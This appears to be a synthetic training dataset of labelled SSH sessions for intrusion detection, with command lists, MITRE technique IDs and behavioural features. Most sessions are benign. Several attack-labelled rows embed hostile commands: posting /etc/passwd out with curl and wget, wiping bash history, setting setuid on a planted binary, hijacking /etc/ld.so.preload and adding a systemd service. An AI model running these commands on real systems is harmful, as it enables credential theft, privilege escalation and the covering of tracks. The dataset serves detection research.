session_id,user,account,client_ip,target_ip,target_hostname,session_start,session_end,duration_sec,commands,event_types,raw_event_count,file_transfer_bytes,label,tactics,source,split,persona,ip_source,target_group,target_criticality,identity_is_synthetic,ip_is_synthetic,ts_is_synthetic,real_user,real_client_ip,real_target_ip,real_target_hostname,mitre,composition,attack_command_count,campaign_id,protocol,has_command_telemetry,start_time,end_time,duration_sec_feat,start_hour,off_hours_flag,is_weekend,command_count,unique_command_ratio,avg_command_length,command_entropy,flag_cred_access,flag_privesc,flag_persistence,flag_log_tamper,flag_recon,flag_exfil,new_source_ip_for_user,new_source_ip_globally,ip_foreign_to_user,distinct_source_ips_prior,distinct_source_ips_24h,source_ip_entropy
gen-d2701a5218ffd8ad8e1a3a51,ghita,p_dev,10.20.10.149,10.10.30.15,web-prod-02,2026-06-18T12:10:30+00:00,2026-06-18T12:10:39.491839+00:00,9.49,"[""awk '{print $1, $5}' log.txt"", 'git', 'find /home -type l', 'find /var/log -type f', ""grep -v 'tmp' filelist.txt"", ""awk '{print $1, $5}' log.txt"", ""grep -c 'error' *.log"", ""grep -v 'tmp' filelist.txt"", ""awk '{sum += $2} END {print sum}' data.txt"", 'find /data -regex "".*/backup_[0-9]+\\.tar\\.gz""', ""grep 'eth0' /var/log/syslog""]","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",11,0,benign,[],generated,train,dev,home,web,2,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-18 12:10:30+00:00,2026-06-18 12:10:39.491839+00:00,9.49,12,0,0,11,0.8181818181818182,25.90909090909091,3.095795255000934,0,0,0,0,0,0,0,0,0,19,2,1.949043906247954
gen-a4973287dc61fca1821d3e2b,salma,p_audit,10.20.30.37,10.10.20.12,db-prod-03,2026-06-24T11:42:18+00:00,2026-06-24T11:42:25.854916+00:00,7.85,"[""grep -E 'error code [0-9]+' error.log"", ""grep 'Failed login' /var/log/auth.log"", 'ls -lh /etc', 'find /tmp -type f -links -2', 'ls -laSh', 'find /tmp -type p', 'ls -lS ..', 'find /tmp \\( -user alice -o -user bob \\)', 'ls -lt /var/log']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",9,0,benign,[],generated,train,auditor,home,db,3,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-24 11:42:18+00:00,2026-06-24 11:42:25.854916+00:00,7.85,11,0,0,9,1.0,22.333333333333332,3.169925001442312,0,0,0,0,0,0,0,0,0,49,4,1.478354240778121
gen-1da94f9068b1b7d3a5b795ca,khadija,p_dev,10.20.10.193,10.10.40.23,build-01,2026-06-22T03:37:22+00:00,2026-06-22T03:38:57.135414+00:00,95.14,"[""grep 'TODO' *.py"", 'python3', 'python3', ""awk '/^[0-9]/' file.txt"", ""awk '/error/ {print NR}' log.txt"", 'find /tmp \\( -user alice -o -user bob \\)', 'find /tmp \\( -user alice -o -user bob \\)', 'find /tmp \\( -user alice -o -user bob \\)', 'echo ""[Service]"" >> /etc/systemd/system/art-systemd-service.service', ""awk '/error/ {print NR}' log.txt"", 'find /home -regex "".*/[A-Z]{3}[0-9]{2}\\.csv""', ""awk '/error/ {print NR}' log.txt"", ""awk '/^[0-9]/' file.txt"", 'find /tmp \\( -user alice -o -user bob \\)']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",14,0,attack,['persistence'],generated,train,dev,home,dev,2,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,['T1543.002'],buried,1,camp-5e40bf68,SSH,1,2026-06-22 03:37:22+00:00,2026-06-22 03:38:57.135414+00:00,95.14,3,1,0,14,0.5,31.642857142857142,2.610577243331642,0,0,1,0,0,0,0,0,0,22,1,1.0723285811274743
gen-afa0375b2192bc540ea8b662,nadia,p_dev,10.20.10.38,10.10.40.21,dev-04,2026-06-23T11:35:07+00:00,2026-06-23T11:35:16.750598+00:00,9.75,"[""awk '{a[NR]=$0} END {for (i=NR-4;i<=NR;i++) print a[i]}' file.txt"", 'zip', 'find /data -regex "".*/2025/.*\\.txt""', ""awk '{print NR, $0}' file.txt"", ""awk '{a[NR]=$0} END {for (i=NR-4;i<=NR;i++) print a[i]}' file.txt"", 'cat -b file.txt', 'git', 'grep -i cron /var/log/syslog | grep -i error', 'find /tmp -perm 644', ""awk '{$2 += 100; print}' file.txt"", 'bzip2', 'find /srv -xdev -type f']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",12,0,benign,[],generated,train,dev,home,dev,1,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-23 11:35:07+00:00,2026-06-23 11:35:16.750598+00:00,9.75,11,0,0,12,0.9166666666666666,28.25,3.4182958340544896,0,0,0,0,0,0,0,0,0,27,4,1.2740986675760617
gen-1da18285d6d474c364051de0,reda,bastionsvc,10.20.40.74,10.10.30.17,web-stg-02,2026-06-03T17:56:46+00:00,2026-06-03T17:56:54.304319+00:00,8.3,"['du -B 4T', 'du -B 4T', 'du -B 4T', 'du -B 512T', 'du -B 512T', 'uptime', 'cd /usr/lib', 'ls -lh ~/Pictures', 'du -B 512T']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",9,0,benign,[],generated,train,admin,home,web,1,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-03 17:56:46+00:00,2026-06-03 17:56:54.304319+00:00,8.3,17,0,0,9,0.5555555555555556,9.777777777777779,2.113283334294875,0,0,0,0,0,0,0,0,0,3,1,0.29643163178752324
gen-64500e9f80709dc2c18f2986,mehdi,p_audit,10.20.30.26,10.10.50.28,mon-01,2026-06-16T16:11:32+00:00,2026-06-16T16:11:36.145222+00:00,4.15,"['find /home -mtime -7 -a -type f', 'find /home -mtime -7 -a -type f', 'find /srv -path ""*/logs"" -prune -o -type f -print', 'find /tmp -size 0']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",4,0,benign,[],generated,train,auditor,home,infra,1,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-16 16:11:32+00:00,2026-06-16 16:11:36.145222+00:00,4.15,16,0,0,4,0.75,32.0,1.5,0,0,0,0,0,0,0,0,0,20,4,1.7979507906426824
gen-ee5a68f5552a3d98c033640c,imane,p_dev,10.20.10.99,10.10.40.23,build-01,2026-06-08T02:19:54+00:00,2026-06-08T02:19:59.325109+00:00,5.33,"['find /home \\( -name ""*.txt"" -o -name ""*.md"" \\)', 'git', 'find /home -type f -links +1', 'curl -X POST --data-binary @/etc/passwd http://127.0.0.1', 'wget --post-data=DATA http://127.0.0.1', 'lp /etc/passwd -h 127.0.0.1']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",6,0,attack,['exfil'],generated,train,dev,home,dev,2,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],burst,3,,SSH,1,2026-06-08 02:19:54+00:00,2026-06-08 02:19:59.325109+00:00,5.33,2,1,0,6,1.0,33.0,2.584962500721156,1,0,0,0,0,1,0,0,0,8,3,1.6098790287368607
gen-5e7bd3d1a1e9cfff1c0977d4,omar,p_dba,10.20.20.23,10.10.20.10,db-prod-01,2026-06-08T09:31:30+00:00,2026-06-08T09:31:39.250952+00:00,9.25,"['du -B 1P', 'truncate -s0 ~/.bash_history', 'find . -type d | ls -R', 'mv', 'mv', ""grep 'error' log.txt"", 'cp', 'find /srv -path ""*/logs"" -prune -o -type f -print', ""grep -v 'debug' output.txt"", 'du -B 1P', 'ls', ""grep -v 'debug' output.txt""]","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",12,0,attack,['log_tamper'],generated,train,dba,home,db,3,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,['T1070.003'],buried,1,,SSH,1,2026-06-08 09:31:30+00:00,2026-06-08 09:31:39.250952+00:00,9.25,9,0,0,12,0.75,16.25,3.084962500721156,0,0,0,0,0,0,0,0,0,10,5,0.7233086319112736
gen-401df5ae3740a6fdb6b01711,reda,bastionsvc,10.20.40.74,10.10.50.28,mon-01,2026-06-22T14:32:50+00:00,2026-06-22T14:32:58.872560+00:00,8.87,"['cd /var/log/kern.log', 'cd /var/log/kern.log', 'cd /var/log/kern.log', 'cd /etc/security', 'free -g -l', 'systemctl', 'cd /var/log/Xorg.failsafe.log', 'du -h --exclude="".git"" /srv', 'uptime', 'du -h --exclude="".git"" /srv']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",10,0,benign,[],generated,train,admin,home,infra,1,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-22 14:32:50+00:00,2026-06-22 14:32:58.872560+00:00,8.87,14,0,0,10,0.7,18.4,2.6464393446710157,0,0,0,0,0,0,0,0,0,27,5,0.9697263080957731
gen-fa957e44def8cfe6647a2ec9,amine,p_audit,10.30.0.12,10.10.30.15,web-prod-02,2026-06-30T13:58:48+00:00,2026-06-30T13:58:56.219890+00:00,8.22,"['uptime', 'uptime', 'ls -lt --time=atime', 'ls -lv', 'ls -lA', 'ls -g', 'ls . ..', 'w', 'ls --no-group']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",9,0,benign,[],generated,train,auditor,jump,web,2,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-30 13:58:48+00:00,2026-06-30 13:58:56.219890+00:00,8.22,13,0,0,9,0.8888888888888888,7.666666666666667,2.94770277922009,0,0,0,0,0,0,0,0,0,40,4,1.1622675032038627
gen-d82aabf3832e28f37689950d,omar,p_dba,10.20.20.23,10.10.20.11,db-prod-02,2026-06-22T11:35:14+00:00,2026-06-22T11:35:23.858462+00:00,9.86,"['du -B 32P', 'du -B 32P', 'du -ah /etc', 'du -B 32P', 'ls', 'du ~/Documents ~/Pictures ~/.zshrc', 'du -h --threshold=500M', 'du -h --exclude="".git"" /srv', 'du -ah /etc', 'du -B 256M', 'cat < file.txt']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",11,0,benign,[],generated,train,dba,home,db,3,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-22 11:35:14+00:00,2026-06-22 11:35:23.858462+00:00,9.86,11,0,0,11,0.7272727272727273,14.363636363636363,2.8453509366224368,0,0,0,0,0,0,0,0,0,37,5,1.0539382767322674
gen-507f73a0e75e0e611a3bcd06,karim,p_dba,10.20.20.192,10.10.20.10,db-prod-01,2026-06-30T06:29:40+00:00,2026-06-30T06:29:49.887228+00:00,9.89,"['du -B 16P', 'find /var -not -group wheel', 'du --help', 'find /opt -not -group staff', 'du -B 16P', ""grep -r 'function' ."", 'find /opt -not -iname ""*.tmp""', 'find /tmp -maxdepth 3 -type f', 'df -h --output=source,fstype', ""grep 'error' access.log"", 'df -h --output=source,fstype,used', 'find /var -not -group wheel']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",12,0,benign,[],generated,train,dba,home,db,3,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-30 06:29:40+00:00,2026-06-30 06:29:49.887228+00:00,9.89,6,1,0,12,0.8333333333333334,22.5,3.2516291673878226,0,0,0,0,0,0,0,0,0,45,7,1.3475756900820353
gen-f97bcca576312d6964503708,hamza,p_dba,10.20.20.92,10.10.20.10,db-prod-01,2026-06-23T02:59:28+00:00,2026-06-23T02:59:34.200199+00:00,6.2,"['cat *.txt', 'find /opt -mindepth 2 -type d', 'cat *.txt', 'tailscale serve --http=2222 /etc/passwd', 'du -ch', 'du -ch', 'du -B 4G', 'df -h --output=source,size,pcent', 'du -B 10G']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",9,0,attack,['exfil'],generated,train,dba,home,db,3,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],buried,1,,SSH,1,2026-06-23 02:59:28+00:00,2026-06-23 02:59:34.200199+00:00,6.2,2,1,0,9,0.7777777777777778,16.333333333333332,2.725480556997868,1,0,0,0,0,0,0,0,0,51,9,1.354577643093644
gen-8ce7411117642e9a6a614018,hamza,p_dba,10.20.20.92,10.10.50.28,mon-01,2026-06-05T07:19:03+00:00,2026-06-05T07:19:12.911968+00:00,9.91,"[""grep -l '127.0.0.1' *"", ""grep -l '127.0.0.1' *"", ""grep -o 'user' users.txt"", 'cat -E file.txt', 'df -h --output=source,used,avail', 'du -B 256P', 'df -i', ""grep -o 'user' users.txt"", 'du -c /var', 'df -ah', 'df -x devtmpfs']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",11,0,benign,[],generated,train,dba,home,infra,1,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-05 07:19:03+00:00,2026-06-05 07:19:12.911968+00:00,9.91,7,1,0,11,0.8181818181818182,16.545454545454547,3.095795255000934,0,0,0,0,0,0,0,0,0,16,6,1.34914794673893
gen-14e4790dc02ac9eb369c5408,khadija,p_dev,10.20.10.193,10.10.30.16,web-stg-01,2026-06-29T11:29:40+00:00,2026-06-29T11:29:48.930014+00:00,8.93,"['grep -i cron /var/log/syslog | grep -i error', 'find /var/log -mtime -1', ""grep 'alias' ~/.bashrc"", ""grep -c 'admin' users.csv"", ""grep -c 'admin' users.csv"", 'find /tmp -ctime 0 -type d', 'cat -n file.txt', ""grep 'alias' ~/.bashrc"", 'zip']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",9,0,benign,[],generated,train,dev,home,web,1,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-29 11:29:40+00:00,2026-06-29 11:29:48.930014+00:00,8.93,11,0,0,9,0.7777777777777778,22.77777777777778,2.725480556997868,0,0,0,0,0,0,0,0,0,26,3,0.9787798921543521
gen-c9bc1691453c81581dcf8607,nadia,p_dev,203.0.113.22,10.10.40.18,dev-01,2026-06-18T12:24:20+00:00,2026-06-18T12:24:47.186620+00:00,27.19,"['cat file.txt | wc -l', 'cat file.txt | wc -l', 'cat file.txt | wc -l', 'cat file.txt | wc -l', 'cat file.txt | wc -l', 'find /var -not -type d', ""sudo sh -c 'echo /tmp/T1574006.so > /etc/ld.so.preload'"", 'tail -n +1 file.txt', 'cat file.txt | wc -l']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",9,0,attack,['privesc'],generated,train,dev,external,dev,1,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,['T1574.006'],buried,1,camp-b0f2998d,SSH,1,2026-06-18 12:24:20+00:00,2026-06-18 12:24:47.186620+00:00,27.19,12,0,0,9,0.4444444444444444,24.0,1.4466166676282082,0,0,0,0,0,0,1,1,0,18,3,1.1016871235757844
gen-83d41000391e21dba7febfbe,reda,bastionsvc,10.99.129.109,10.10.30.17,web-stg-02,2026-06-22T02:44:55+00:00,2026-06-22T02:45:03.350422+00:00,8.35,"['du -B 2M', 'du -B 2M', 'ls -laut', 'du -h --exclude=""/var/log"" /var', 'du -B 2M', 'curl --help', 'curl --version', 'du -ah | sort -h', 'ls -lh /var/log/*.log', 'curl --help']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",10,0,benign,[],generated,train,admin,vpn,web,1,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-22 02:44:55+00:00,2026-06-22 02:45:03.350422+00:00,8.35,2,1,0,10,0.7,13.6,2.6464393446710157,0,0,0,0,0,0,1,0,1,23,2,0.924262282603756
gen-4ad5e4d825c7862900f62baf,sara,bastionsvc,10.20.40.189,10.10.50.27,backup-01,2026-06-09T12:29:17+00:00,2026-06-09T12:29:22.075906+00:00,5.08,"['ls -la', 'cd /usr/share/xfce4', 'cd /usr/share/xfce4', 'free -g', 'free -g', 'cd /var/log/boot']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",6,0,benign,[],generated,train,admin,home,infra,3,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-09 12:29:17+00:00,2026-06-09 12:29:22.075906+00:00,5.08,12,0,0,6,0.6666666666666666,12.333333333333334,1.9182958340544896,0,0,0,0,0,0,0,0,0,19,5,1.1622226045499104
gen-aab2128a254b2eb5019ddaa7,reda,bastionsvc,10.20.40.74,10.10.30.15,web-prod-02,2026-06-18T07:15:10+00:00,2026-06-18T07:15:18.866644+00:00,8.87,"['du -B 256P', 'du -B 256P', 'df -h --output=source,target', 'cd scripts', 'curl --version', 'du -h --exclude="".cache"" /home', 'du -h --exclude=""*.so"" /usr', 'df -t nfs', 'df -t nfs', 'ls -S | head -n 5']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",10,0,benign,[],generated,train,admin,home,web,2,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-18 07:15:10+00:00,2026-06-18 07:15:18.866644+00:00,8.87,7,1,0,10,0.8,16.4,2.9219280948873623,0,0,0,0,0,0,0,0,0,21,3,0.9324765326515249
gen-2985fb43eb98ca81bc4dac96,mehdi,p_audit,10.20.30.26,10.10.50.28,mon-01,2026-06-11T11:10:29+00:00,2026-06-11T11:10:34.350501+00:00,5.35,"['ls -o', ""grep -E '([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}' logfile.txt"", 'ls -r', ""grep -r 'panic' /var/log"", 'cat -E file.txt', 'ls -r', ""grep ';$' script.sh"", ""grep ';$' script.sh""]","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",8,0,benign,[],generated,train,auditor,home,infra,1,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-11 11:10:29+00:00,2026-06-11 11:10:34.350501+00:00,5.35,11,0,0,8,0.75,19.0,2.5,0,0,0,0,0,0,0,0,0,14,2,1.7880281366641522
gen-46feacd4fe1393cd0f2d5c15,ghita,p_dev,10.20.10.149,10.10.30.14,web-prod-01,2026-06-22T10:10:39+00:00,2026-06-22T10:10:47.602702+00:00,8.6,"[""grep -v 'debug' output.txt"", ""grep -v 'debug' output.txt"", 'tail -c 1M file.txt', 'find /tmp -size 0', ""grep -E 'http[s]?://\\S+' file.txt"", 'find /opt -not -group staff', 'git', 'git', 'find /home -path ""*/.svn"" -prune -o -type f -print', ""awk -F',' '{print $2}' file.csv"", ""awk -F',' '{print $2}' file.csv"", ""awk 'max < $3 {max=$3} END {print max}' file.txt""]","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",12,0,benign,[],generated,train,dev,home,web,2,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-22 10:10:39+00:00,2026-06-22 10:10:47.602702+00:00,8.6,10,0,0,12,0.75,26.166666666666668,3.084962500721156,0,0,0,0,0,0,0,0,0,22,3,2.0336132190988843
gen-0bcabfe154c4321c06764712,yassine,p_dev,10.20.10.174,10.10.40.19,dev-02,2026-06-29T12:44:19+00:00,2026-06-29T12:44:29.331674+00:00,10.33,"['awk \'{print $1 "" "" $2}\' names.txt', 'awk \'{print $1 "" "" $2}\' names.txt', 'awk \'{print $1 "" "" $2}\' names.txt', ""grep 'error' access.log"", ""awk 'NR % 2 == 0' file.txt"", 'python3', ""awk -F',' '{print $1, $3}' records.csv"", 'touch', 'tail -n +1 file.txt', 'find /home -size -1k', 'grep CRON /var/log/syslog', 'find /data -not -empty']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",12,0,benign,[],generated,train,dev,home,dev,1,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-29 12:44:19+00:00,2026-06-29 12:44:29.331674+00:00,10.33,12,0,0,12,0.8333333333333334,23.666666666666668,3.188721875540867,0,0,0,0,0,0,0,0,0,34,4,2.2107148173721285
gen-f91f546cf142b1caea1c4acc,hamza,p_dba,10.20.20.92,10.10.20.10,db-prod-01,2026-06-08T08:33:38+00:00,2026-06-08T08:33:43.779903+00:00,5.78,"['du -B 100K', 'df -h --output=source,fstype,ipcent', 'du -B 100K', 'du -B 4T', 'df -h --output=source,fstype,ipcent', 'df -h --output=source,fstype,size', 'du -B 100K', 'df -h --output=source,ipcent']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",8,0,benign,[],generated,train,dba,home,db,3,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-08 08:33:38+00:00,2026-06-08 08:33:43.779903+00:00,5.78,8,0,0,8,0.625,21.125,2.1556390622295662,0,0,0,0,0,0,0,0,0,21,4,1.3521522155867178
gen-c0abfd26df86a42fa7080b44,omar,p_dba,10.20.20.23,10.10.20.10,db-prod-01,2026-06-29T01:41:36+00:00,2026-06-29T01:41:39.786127+00:00,3.79,"['du -h --exclude=""/var/log"" /var', 'sudo chmod u+xs /tmp/evilBinary', 'sudo chown root /tmp/evilBinary', ""sudo sh -c 'echo /tmp/T1574006.so > /etc/ld.so.preload'"", 'sudo chown root /tmp/evilBinary']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",5,0,attack,['privesc'],generated,train,dba,home,db,3,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,"['T1548.001', 'T1574.006']",burst,4,,SSH,1,2026-06-29 01:41:36+00:00,2026-06-29 01:41:39.786127+00:00,3.79,1,1,0,5,0.8,35.8,1.9219280948873623,0,0,0,0,0,0,0,0,0,43,1,1.0591774182507339
gen-094ba2de392b22c6ad91174e,imane,p_dev,10.20.10.123,10.10.40.20,dev-03,2026-06-15T08:41:40+00:00,2026-06-15T08:41:47.379604+00:00,7.38,"[""awk '{c += length($0)} END {print c}' file.txt"", 'git', 'find /var -anewer /tmp/test.log', 'ln -sf /dev/null ~/.bash_history', ""grep 'connection timed out' logs/*"", 'find /tmp \\( -size +1M -o -size -1k \\)', 'git', 'find /tmp \\( -size +1M -o -size -1k \\)', 'find /var -type d -print0']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",9,0,attack,"['log_tamper', 'exfil']",generated,train,dev,home,dev,1,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,['T1070.003'],buried,1,,SSH,1,2026-06-15 08:41:40+00:00,2026-06-15 08:41:47.379604+00:00,7.38,8,0,0,9,0.7777777777777778,27.77777777777778,2.725480556997868,0,0,0,0,0,0,0,0,0,20,3,2.0272638559179317
gen-4cc3a101facd1cba678d70a3,yassine,p_dev,10.99.46.37,10.10.40.19,dev-02,2026-06-11T11:41:04+00:00,2026-06-11T11:41:13.720810+00:00,9.72,"['find /home -not -path ""*/.cache/*""', ""grep 'config' *.conf"", ""grep 'home' /etc/fstab"", ""grep 'home' /etc/fstab"", 'grep pattern file.txt | tail', 'find /var -perm /g=w', 'find /srv -type f -print | sort', ""grep 'eth0' /var/log/syslog"", 'zip', ""grep 'connection timed out' logs/*"", ""grep 'home' /etc/fstab"", 'git']","['KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT', 'KBD_INPUT']",12,0,benign,[],generated,train,dev,vpn,dev,1,True,True,True,test-ssh,192.168.1.32,192.168.1.74,debian-lab,[],benign,0,,SSH,1,2026-06-11 11:41:04+00:00,2026-06-11 11:41:13.720810+00:00,9.72,11,0,0,12,0.8333333333333334,22.166666666666668,3.188721875540867,0,0,0,0,0,0,1,1,0,13,5,1.9661432886938304
